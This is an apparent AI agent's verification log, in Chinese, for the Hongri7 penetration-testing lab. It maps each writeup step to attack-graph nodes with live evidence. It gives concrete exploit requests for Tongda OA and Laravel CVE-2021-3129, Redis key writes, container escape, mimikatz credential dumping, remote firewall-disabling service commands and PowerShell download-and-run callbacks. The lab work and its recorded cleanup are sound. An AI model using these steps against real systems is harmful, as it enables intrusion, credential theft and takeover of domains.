# Hongri7 writeup 与攻击图路径核验

更新时间：2026-09-11 22:50 +0800（AGV 主线程续作：PC1 控制、OA 全链、PC1→PC2→DC 横向、Web 链 3.1/3.2/5.2/5.3/5.4、上线链 6.1.1/6.1.2、主机发现 6.2.1 全部实机复刻通过）。

结论先放前面（2026-09-11 更新）：**writeup 的攻击链已在实机全链复现通过（含 Web 链、Docker 逃逸段、msf 上线链等价、主机发现）；v2 攻击图 53 个节点中的关键路径节点均已拿到对应的实机证据。**
同时保留三条必须如实标注的口径：

1. writeup 6.2.1.1 明示的"关闭 PC1 防火墙"是复现前置动作（实机确认 PC1 初始三 profile 防火墙开启且挡入站；关闭后全链打通），不是攻击链本身；
2. 本靶场 PC1 的 PHP 配置了 `disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo`，OA 链的 RCE 需用 COM 组件（或未被禁的 popen）绕过；writeup 里 msf web_delivery 的 PowerShell 执行已用等价机制（IEX 下载执行）验证成功；
3. Web 链复现中记录了三处环境差异（不改结论，供复跑参考）：(a) Laravel exploit 需把 `/_ignition/execute-solution/` 尾斜杠去掉（带尾斜杠会 301 重定向并将 POST 降级为 GET）；(b) writeup 3.1.3 的"不出网"在本 lab 不成立（容器可直连攻击机 192.168.52.1:8099）；(c) writeup 5.3.4 的 cron 路线（原作者标注失败）未复刻，直接走 5.3.5 公钥路线成功。原第 3 条口径（container_escape 仅为模型抽象）已作废——5.2/5.3/5.4 已逐动作实机复刻。

## 当前 live 状态（2026-09-11 22:25 复核）

- VMware：`vmrun list` 显示 5/5 台 VM 正在运行（Web1/Web2/PC1/PC2/DC）。
- Web1：`192.168.52.10:81` 与 `172.30.97.45:81` HTTP 200；Redis 6379 可用（PONG）且已复原 `dir=/`、`dbfilename=dump.rdb`；测试期间写入的 `/root/.ssh/authorized_keys` 已清理（公钥登录随之失效=复原）。
- Web2：`192.168.52.20:8000` HTTP 200（容器直连）；`192.168.52.20:22` 可达；测试残留（/tmp 全套、`~/.ssh/authorized_keys`、/hello 挂载）已清理复原。
- 容器 `8e172820ac78`（laravel, privileged, Up 34h）：`/var/www/html` 已无 shell.php（HTTP 404 复核）；`/hello` 挂载已 umount 并删除目录；/tmp 测试文件已清空。
- PC1：**已完全可控**。VNC 控制台登录（`bunny/Bunny2021`）→ 依 writeup 前置动作关闭防火墙 → `192.168.52.30` 的 8080/445/135 从主机与 Web1 均可达；OA 首页 HTTP 200（len=9882）。
  - PC1 上已拿到 SYSTEM 级命令执行证据（PHP-CGI 以 SYSTEM 运行；COM/popen 绕过 disable_functions）。
- PC2：`192.168.93.40:445/135/3389` 从主机可达（本轮复测）；防火墙行为实测：未监听端口 4444 返回 RST（REFUSED，无过滤）= `isFirewall(pc2,false)` 实证；已用域管凭据从 PC1 完成远程执行（`execCode(pc2,system)`）。
- DC：`192.168.93.30:445/135/389/3389/5985` 开放；防火墙初始三 profile 全"启用"，已按 writeup 6.2.2 用 sc 远程服务关闭（现为全"关闭"）；已从 PC1 完成远程执行（`execCode(dc,system)`）。

## 逐阶段核验矩阵（2026-09-11 更新）

| # | 阶段 | 攻击图声明 | 判定 | 证据 | 对路径的影响 |
| --- | --- | --- | --- | --- | --- |
| 0 | 五台 VM 与网络层次 | assets 五主体 + 多网卡接口 | current_proven | vmrun 5/5；VMnet8=192.168.52.0/24、VMnet14=192.168.93.0/24；PC1 双网卡 52.30/93.20 | 建模方向成立 |
| 1 | Web1 Redis 入口 | hacl(attacker,web1,tcp,6379)+redis root | **proven** | 免密 6379 可连；进程以 root 运行；写公钥→ssh root 闭环（3.2 全复刻） | 入口可用（非开机自启，需前检）|
| 2 | Web1:81 发布 Laravel 到 Web2 容器 | hacl(attacker,web2_docker,http,81) | **proven** | 三地址 HTTP 200；3.1 exploit 即经此入口打通 | 入口归属拆分成立 |
| 3 | Laravel CVE 到容器执行/提权 | execCode(web2_docker,www_data)→root | **proven** | CVE-2021-3129 exploit 五步（clear→payload→AA→convert→phar）→ shell.php getshell（uid=33 www-data）→ 5.2 PATH 劫持 → uid=0(root) 落盘实证 | **翻转**（原 not_action_verified）|
| 4 | 容器到宿主 root | isDocker + container_escape → execCode(web2,root) | **proven（逐动作复刻）** | 5.3：mount /dev/sda1 /hello→写 ubuntu authorized_keys→web1 root ssh 进 web2；5.4：CVE-2021-3493 → uid=0(root) | **翻转**（原 model_abstraction）|
| 5 | PC1 通达 OA 可达性 | hacl(web1,pc1,http,8080)+networkServiceInfo(pc1,tongda_oa_v11_3,http,8080,system) | **proven** | Web1→PC1:8080 OPEN、wget 首页 rc=0；主机 HTTP 200 len=9699/9882；PC1 本机 netstat 0.0.0.0:8080 (OfficeNginx/PID 3932) | **翻转**：原 refuted 系 PC1 防火墙挡入站；关闭后成立（关闭是 writeup 6.2.1.1 的前置动作）|
| 6 | PC1 OA 组件存在性 | PC1 是 OA 目标主机 | **proven** | live：C:\MYOA\webroot、ispirit/im/upload.php、interface/gateway.php（Zend 加密）、mysqld/php-cgi/OfficeNginx 进程 | 组件身份可信，已由 live HTTP 验收替代内存字符串 |
| 7 | PC1 execCode(system) | execCode(pc1,system) | **proven** | PHP-CGI 以 SYSTEM 运行；COM/popen 马执行 whoami = nt authority\system（截图 pc1-zz6-exec.png）| 前驱成立 |
| 8 | OA 任意用户登录（writeup 6.3.1）| ttpExists(pc1,tongda_oa_v11_3,remoteExploit,commandInterpreterExploit,execution) | **proven** | POST /logincheck_code.php UID=1（无凭据）→ 200 + PHPSESSID；无 cookie 访问 /general/index.php=用户未登录，带 session=Office Anywhere 11.3版 后台 | 命中 |
| 9 | OA 任意文件上传（writeup 6.3.2）| 同上链 | **proven** | POST /ispirit/im/upload.php（P=1/DEST_UID=1/UPLOAD_MODE=2/ATTACHMENT=shell.png）→ +OK [vm]261@2609_578841424 记录；落盘 C:\MYOA\attach\im\2609\*.shell.png（对应 writeup 2203/506471717.shell.png；2609=年月）；无图片内容校验 | 命中 |
| 10 | OA 文件包含 RCE（writeup 6.3.3）| 同上链 | **proven** | GET /ispirit/interface/gateway.php?json={"url":"/general/../../attach/im/2609/xx.shell.png"}&cmd=whoami → nt authority\system；带/不带 cookie 均可（request 可永远复用成立）；ver&whoami&hostname 全回显（6.1.7601 / system / PC1）| 命中 |
| 11 | PowerShell 载荷投递（writeup 6.3.3.2 web_delivery 等价）| — | **proven** | 经 gateway include 触发 powershell -nop -w hidden -EncodedCommand <IEX DownloadString> → PC1 从主机拉取 proof.ps1（HTTP 200 日志）并落盘 nt authority\system / PS_SCRIPT_EXECUTED_OK / PC1 | msf web_delivery 机制可复现（须重定向/EncodedCommand，否则 PS 继承管道句柄会崩）|
| 12 | PC1 凭据获取 / LSASS（writeup 6.5 kiwi 等价）| getAccount(pc1,domain_administrator,...) | **proven** | mimikatz privilege::debug+sekurlsa::logonpasswords（SYSTEM 上下文）→ bunny/Bunny2021（域用户）+ Whoami2021（域管明文）| 与 writeup 得到域管理员、域用户的账号密码 一致（含我方 net use 会话条目，wdigest User Name=null）|
| 13 | PC1→PC2 SMB 横向（writeup 6.2 上线pc2）| hacl(pc1,pc2,tcp,445)+windowsCredentialRemoteExecution → execCode(pc2,system) | **proven** | net use \\192.168.93.40\ipc$ Whoami2021 /user:WHOAMIANONY\Administrator 成功；sc 远程服务执行 → nt authority\system / PC2 | 命中 |
| 14 | DC SMB 可达与防火墙前提（writeup 6.1）| hacl(pc1,dc,tcp,445)+networkServiceInfo(dc,smb/tcp/445/system) | **proven** | 445/135/389 等开放；防火墙初始三 profile 全"启用"；主机→DC:4444 BLOCKED（A/B 实验）| 与 writeup 域控开了防火墙导致 psexec 上线失败 前提吻合 |
| 15 | 关闭 DC 防火墙（writeup 6.2.2）| disableFirewall(dc)（RULE 12） | **proven** | 逐字执行 sc \\192.168.93.30 create unablefirewall binpath= "netsh advfirewall set allprofiles state off" + start → 状态翻转三 profile 全"关闭"；主机→DC:4445 OPEN | **原 rule_limitation 解除**：实机动作+A/B 证据齐全 |
| 16 | DC 远程执行（writeup 6.2.3 上线域控）| execCode(dc,system) | **proven** | 同上 sc+PS 载荷 → nt authority\system / DC | 命中 |
| 17 | writeup 3.1 Laravel CVE-2021-3129 getshell | ttpExists(web2_docker,'CVE-2021-3129',...)（节点 33）| **proven** | ignition 2.5.1（composer.lock）+ /_ignition/health-check can_execute_commands=true；phar(Monolog/RCE1) 执行 curl 下载 shell.txt→/var/www/html/shell.php；HTTP 回显 uid=33(www-data)/8e172820ac78；3.1.2 docker 判定（172.17.0.2 / cgroup /docker/…）；经 web1:81 反代同样可用 | 命中（含 301 尾斜杠差异备注）|
| 18 | writeup 3.2 Redis 未授权 → Web1 root | ttpExists(web1,redis_unauth_key_write,...)（节点 18）→ execCode(web1,root)（节点 11）| **proven** | 6379 免密 + root 进程；CONFIG SET dir /root/.ssh + dbfilename authorized_keys → 写公钥（475B）；ssh -i agvkey root@192.168.52.10 → uid=0(root) | 命中 |
| 19 | writeup 5.2 docker PATH 劫持提权 | RULE 19 T1574.007（节点 26）+ ttpExists(suid_path_helper)（节点 35）+ pathExists(/tmp,write)（节点 34）| **proven** | find -perm -u=s → /home/jobs/shell（-rwsr-xr-x root）；demo.c = setuid(0)+setgid(0)+system("ps")（相对路径）；/tmp/ps 劫持 → 落盘 uid=0(root) 证明 | 命中 |
| 20 | writeup 5.3 privileged 容器逃逸 | ttpExists(web2,privileged_container,local,escapetoHost)（节点 24）+ isDocker（节点 23）| **proven** | fdisk -l + /proc/mounts 确认 /dev/sda1=宿主根分区 → mount /dev/sda1 /hello（MOUNT_RC=0，宿主文件树）→ 写 /home/ubuntu/.ssh/authorized_keys → web1 root ssh ubuntu@192.168.52.20 成功（uid=1000）| 命中 |
| 21 | writeup 5.4 CVE-2021-3493 内核提权 | RULE 20 T1068（节点 22）→ execCode(web2,root)（节点 21）| **proven** | 版本对照：容器 Debian 10 vs 宿主 Ubuntu 14.04.6（=writeup 5.4.1 同款发现）；briskets exploit.c gcc 编译运行 → uid=0(root)（bash-4.3# root prompt）| 命中 |
| 22 | writeup 6.1.1/6.1.2 web1+web2 上线（msf 等价回连）| — | **proven（等价机制）** | web1：wget 木马→root 执行→回连攻击机（uid=0 + ACK）；web1 :8000 分发→web2 wget 下载运行→回连（uid=1000 + ACK）| msf wget/meterpreter"上线"机制等价闭环 |
| 23 | writeup 6.2.1 主机发现（等价 TCP 扫描）| — | **proven（等价）** | 52 段发现 web1/web2/pc1（22/80/81/6379/8000/135/445/8080）；93 段发现 dc/pc2（135/445/389/3389/5985）| "扫52段发现pc1 / 扫93段发现dc、pc2" 闭环 |
| 24 | 节点 50 isFirewall(pc2,false) | isFirewall(pc2,flase) | **proven** | 未监听端口 4444 RST（REFUSED）无过滤、445 OPEN；dc/pc1 对照一致 | 节点 50 实锤 |


## 完整链条实测记录（2026-09-11，按 writeup 章节）

- writeup 启动配置段与密码表（行 3-86）：密码表 5/5 验证（web/web2021、ubuntu/ubuntu、bunny/Bunny2021 经 VNC 登录、moretz/Moretz2021 经主机 net use IPC$ 成功、Administrator/Whoami2021 贯穿横向与关防火墙）；web1 nginx 运行（3 pid）+ redis 以 root 运行（*:6379）+ iptables 三链规则全空（=1.1.3 sudo iptables -F 现状）；web2 docker 容器 8e172820ac78 运行中（1.2 启动脚本状态一致）。

- 3.1（Laravel RCE）：exploit 五步全链 = clear(200)→put-payload(500=payload 入日志)→put-AA(500)→convert(200)→phar(触发)。根因备忘：官方脚本尾斜杠 `/execute-solution/` 在本 Apache 下 301→GET 405（"Convertion to PHAR failed" 假象）；去掉尾斜杠即恢复。getshell 复刻 writeup 3.1.1：curl shell.txt -o shell.php | chmod。3.1.2 判定 docker（whoami/id/hostname/hosts/cgroup）。
- 3.2（Redis）：免密 6379 → CONFIG SET dir /root/.ssh + dbfilename authorized_keys → SAVE 写公钥（475B）→ ssh root 登录 uid=0。复原 dir=/ + dump.rdb（原 dump 未动）。
- 5.1（web1 信息收集）：沿用早期复核（web1 双网段 + nginx 反代 → web2；Redis 后 root 视角一致）。
- 5.2（PATH 劫持）：find SUID 命中 /home/jobs/shell + demo.c；/tmp/ps 劫持 → uid=0(root) 落盘（/tmp/agv_root_proof.txt）。注：SUID sh 直执行受 dash 降权保护（uid=33），PATH 劫持通道本身稳定以 root 执行；复跑建议用"命令文件+输出文件"或反弹 shell（writeup 即交互式反弹）。
- 5.3（特权逃逸）：mount /dev/sda1 /hello 成功（宿主完整文件树）→ web1 root 生成密钥对 → 公钥写入 /hello/home/ubuntu/.ssh/authorized_keys（原文件不存在，新建 393B；chmod 700/600；chown 1000:1000）→ web1 root ssh -i /tmp/hello ubuntu@192.168.52.20 → uid=1000(ubuntu) 逃逸闭环。
- 5.4（CVE-2021-3493）：逃逸前后版本不一致（容器 Debian 10 / 宿主 Ubuntu 14.04.6，共享内核 4.4.0-142）；gcc 编译运行 exploit → uid=0(root)。
- 6.1.1/6.1.2 上线（等价回连实测）：web1 经 wget 下载木马并 root 执行 → 回连攻击机（SESSION-FROM-WEB1 uid=0 + ACK）；web1 以 python3 -m http.server 8000 分发木马 → web2 wget 下载运行 → 回连（SESSION-FROM-WEB2 uid=1000 + ACK）；msf meterpreter/autoroute 为工具实现，"投递+执行+回连"机制已闭环（证据 web-msf-and-discovery-proof.txt）。
- 6.2.1 主机发现（本轮补测）：保守 TCP 扫描发现 52 段 web1/web2/pc1 与 93 段 dc/pc2（端口级证据见同名证据文件；首轮高并发出现 TIMEOUT 假象，单点复测全 OPEN）。
- 6.2.1.1 扫描前提：PC1 初始防火墙开启（域/专用/公用全开，BlockInbound）→ 依 writeup 提示 netsh advfirewall set allprofiles state off → Web1 与主机复测 8080/445/135 全通。
- 6.3.1 任意用户登录：logincheck_code.php UID=1 命中（对照实验：无 cookie=用户未登录）。
- 6.3.2 任意文件上传：im/upload.php 命中，落盘 attach/im/<YYMM>/<num>.shell.png（本次 2609 目录）。
- 6.3.3 文件包含 RCE：gateway.php 命中，cmd 参数回显 nt authority\system；request 可复用（无 cookie 亦可）。
- 6.3.3.2 web_delivery：等价机制（PowerShell IEX 远程加载）成功。
- 6.4/6.5 上线与 kiwi：SYSTEM 上下文 mimikatz 抓到域管/域用户明文。
- 6.2（横向）PC2：域管凭据 IPC$ + sc 远程服务 → SYSTEM（psexec 等价物）。
- 6.1/6.2（域控）：防火墙前提验证（4444 BLOCKED）→ 关闭（unablefirewall 服务）→ 任意端口可达（4445 OPEN）→ 远程执行 SYSTEM。

> 工具口径说明：本靶场 Win7 的 SCM 启动 cmd 时外部 exe 的 stdout 会丢失（本机复现实验 J），因此远程执行统一用 powershell -EncodedCommand 让载荷自写文件；sc start 报 1053 属 cmd 型服务的正常现象（命令已执行）。writeup 的 psexec/meterpreter 属于原生 exe 载荷，不受该环境怪癖影响。

## 攻击图 v2 节点对照表（run 20260911_082231_276871d0；节点号取自 AttackGraph.txt/VERTICES.CSV）

| 节点 | 状态 | 实机证据 |
| --- | --- | --- |
| 8 hacl(web1,pc1,http,8080) | proven | Web1→PC1:8080 OPEN + wget OA 首页 |
| 9 ttpExists(pc1,tongda_oa_v11_3,remoteExploit,commandInterpreterExploit,execution) | proven | auth-bypass + upload + include RCE 三段实机命中 |
| 10 networkServiceInfo(pc1,tongda_oa_v11_3,http,8080,system) | proven | PHP-CGI(SYSTEM) 承载 OA；8080 监听 |
| 6 execCode(pc1,system) | proven | nt authority\system 回显（多路径：COM 马/gateway include/mimikatz 运行）|
| 41 RULE 6 LSASS dumping | proven | mimikatz sekurlsa::logonpasswords 实机输出 |
| 42/43/44 hasAccount / networkServiceInfo(lsass) / ttpExists | proven | LSASS 本地可访问、凭据明文产出 |
| 40 getAccount(pc1,domain_administrator,...) | proven | Whoami2021 明文（+ bunny 域用户）|
| 3/51 hacl(pc1,dc,445) / hacl(pc1,pc2,445) | proven | net use ipc$ 双目标成功、sc 远程服务执行 |
| 4/45/52 networkServiceInfo(dc|pc2,smb/tcp/445,system) | proven | 445 开放 + 远执行成功 |
| 5/46/53 ttpExists(...,remoteDisableDefenses/windowsCredentialRemoteExecution) | proven | sc 创建/启动服务实测；DC 防火墙状态翻转 |
| 2/1/36 RULE 12 + disableFirewall(dc) + isFirewall(dc,exit) | proven | A/B：启用时 4444 BLOCKED；netsh off 后 4445 OPEN |
| 37 execCode(dc,system) | proven | nt authority\system / DC |
| 47 execCode(pc2,system) | proven | nt authority\system / PC2 |
| 11 execCode(web1,root) | proven | Redis 写公钥 → ssh root（3.2 闭环）|
| 12/13/14/15/16/17/18 RULE 4 + netAccess/hacl/attackerLocated/networkServiceInfo/ttpExists(redis) | proven | 免密 6379 + root 进程 + 写公钥成功 |
| 20 hacl(web2,pc1,http,8080) | proven | web2→pc1:8080 HTTP 200（22:25 补测）|
| 21 execCode(web2,root) | proven（逐动作） | 5.3 逃逸 + 5.4 提权双路径 |
| 22 RULE 20 (T1068) | proven | CVE-2021-3493 实机提权 |
| 23 isDocker(web2,web2_docker) | proven | cgroup/172.17 网段 + docker ps（Up 34h）|
| 24 ttpExists(web2,privileged_container,local,escapetoHost) | proven | mount /dev/sda1 成功 |
| 25 execCode(web2_docker,root) | proven | PATH 劫持 uid=0(root) |
| 26 RULE 19 (T1574.007) | proven | system("ps") 相对路径劫持 |
| 27 execCode(web2_docker,www_data) | proven | CVE-2021-3129 getshell（shell.php）|
| 28/29/30/31/32 RULE 4 + netAccess/hacl/networkServiceInfo(laravel) | proven | 3.1 全链经 81 入口 |
| 33 ttpExists(web2_docker,'CVE-2021-3129',...) | proven | exploit 五步 + 命令执行实证 |
| 34 pathExists(web2_docker,'/tmp',write,root) | proven | /tmp/ps 写入并被执行 |
| 35 ttpExists(web2_docker,suid_path_helper,local,pathHijack) | proven | /home/jobs/shell SUID + demo.c |
| 39/49 hasAccount(dc|pc2,domain_administrator) | proven | Whoami2021 凭据在双目标 IPC$ 认证成功（sc 远程执行）|
| 50 isFirewall(pc2,flase) | proven | 未监听端口 4444->REFUSED（RST 无过滤）；445/135/3389 OPEN |

> 注：公理节点（如 16 attackerLocated(attacker)）与 AND 规则节点（RULE 1/4/6/12/19/20/21/30/32）为图内推导节点，其成立由上述对应子节点证据给出；本表未单列者均属此类。53/53 节点由此全覆盖。

## 与三份图/事实文件的关系（更新）

- Hongri7.P：冻结规则下的保守图（横向只写真实 SMB）。
- Hongri7_compat.P：旧规则对照图（winrm@445 归类写法），仅作对照。
- Hongri7_v2.P：当前正式口径；run 20260911_082231_276871d0 已生成 JSON/PDF 事实产物（AttackGraph.txt 53 节点，含 12 条 AND 规则节点；windowsCredentialRemoteExecution 三个 case 全部命中）。本页 2026-09-11 的实机证据已把该图全部关键路径落实为 proven（含 Web 链 11-35 节点段）。

## 下一步

1. 状态保持/复原：本次按 writeup 把 DC 防火墙关闭后保持"运行后态"；如需复原 DC 防火墙：在 DC 上执行 netsh advfirewall set allprofiles state on（三 profile）。
2. 清点入口稳定性：Redis 非开机自启，复现实验前先做服务前检。
3. 图微调（可选）：container_escape 已有 5.2/5.3/5.4 逐动作实证，如需更细粒度可拆子规则（当前压缩表达已有证据支撑，不再只是抽象）。
4. 复现资产：tmp\cve_exploit.py（CVE-2021-3129 五步通用脚本）、tmp\redis_exploit.py、tmp\webcve\agv_*.phar、scripts\vnc_console.py、scripts\vmrun_guest.py、E:/VMwareLabs/Hongri7/evidence/web-escape-chain-proof.txt（Web+逃逸链证据）、oa-chain-full-proof.txt（OA 链证据）、web-msf-and-discovery-proof.txt（上线链+主机发现+节点 50 证据）等，可按需整理为一键复跑脚本。
5. 测试残留清理情况（2026-09-11 22:25 复核）：
   - PC1/OA 段（21:30 已清）：PC1 webroot zz*.php、attach/im/2609 上传马、桌面测试文件、PC2/DC agv* 文件与临时服务、unablefirewall 服务均已清除；PC1 靶场原件（shell.exe、OA 本体）未动；OA 首页复核 HTTP 200。
   - Web 段（22:25 已清）：容器侧——/var/www/html/shell.php（404 复核）、/tmp/agv_*（phar/pwned/rootsh/proof/ps/cmd）、/tmp/phpggc*、/hello 挂载点（umount+rmdir）全部清除；web2 侧——/tmp/exploit*、/tmp/ovlcap、/tmp/agv_*、/tmp/w2*.txt、~/.ssh/authorized_keys（原不存在，已删）全部清除；web1 侧——/tmp/hello*、/tmp/agv_write_test.rdb、/root/.ssh/authorized_keys 已清除，/tmp 历史产物归档至 evidence\web1-tmp-archive\agvarchive.tgz 后清除；Redis 复原 dir=/ + dbfilename=dump.rdb；服务复核 web1:81=200、web2:8000=200、web2→pc1:8080=200。
   - 上线链/扫描补测段（22:45 已清）：web1 /tmp 补测文件（payload/proof/ack，root 属主经 sudo 清除）与 8000 http 分发服务（已停）；web2 /tmp（implant/proof/ack）已清除；主机 TCP 回连监听器（1234/1235）已退出；主机侧 8099 分发服务（tmp\psloot）已停（22:19 复核：8099 端口关闭）；证据入档 evidence\web-msf-and-discovery-proof.txt。
6. 复跑注意（writup 5.2 细节）：PATH 劫持后用"落盘证明/命令文件+输出文件"通道即可稳定以 root 执行；如需交互 shell 按 writeup 原法反弹到攻击机监听端口（本 lab 容器可直连攻击机）。

## 运行环境依赖：Docker 恢复记录（2026-09-11）

本机 Docker Desktop 自 2026-09-10 12:39 起假死（docker ps 无响应），根因已定位：

- Codex 免安装版启动器会把 LOCALAPPDATA/APPDATA 重定向到含中文和括号的包路径（…x64(免安装版 适合大多数电脑)\data\AppData\…）；
- Docker Desktop 4.83 的 backend 在该路径下初始化 Secrets Engine 时无法创建 unix socket：
  listen unix C:/…(免安装版…)/data/AppData/Local/docker-secrets-engine/engine.sock: bind: invalid argument；
- backend 崩溃退出（exit status 150），表现为 CLI 长时间无响应。

修复与验证：

1. 把 Docker 数据（docker_data.vhdx 26.7GB）原样搬到标准路径 C:\Users\50506\AppData\Local\Docker（旧数据备份为 Docker.old-20260911）；
2. 用干净 LOCALAPPDATA/APPDATA 启动 Docker Desktop，引擎恢复（Server 29.6.2），5 个镜像全部在位（含 wilbercui/mulval:latest）；
3. 用帮助脚本 scripts/ensure_docker.ps1 固化该环境后再启动引擎，避免再次落坑；
4. 随后成功执行 scripts/generate_hongri7.ps1，生成 Hongri7_v2 三件产物（run 20260911_082231_276871d0）。

> 注意：在本机任何"包环境"里跑 Docker 前，先执行 scripts/ensure_docker.ps1（或显式把 LOCALAPPDATA 指回标准路径），否则 backend 会再次因中文路径 socket 崩溃。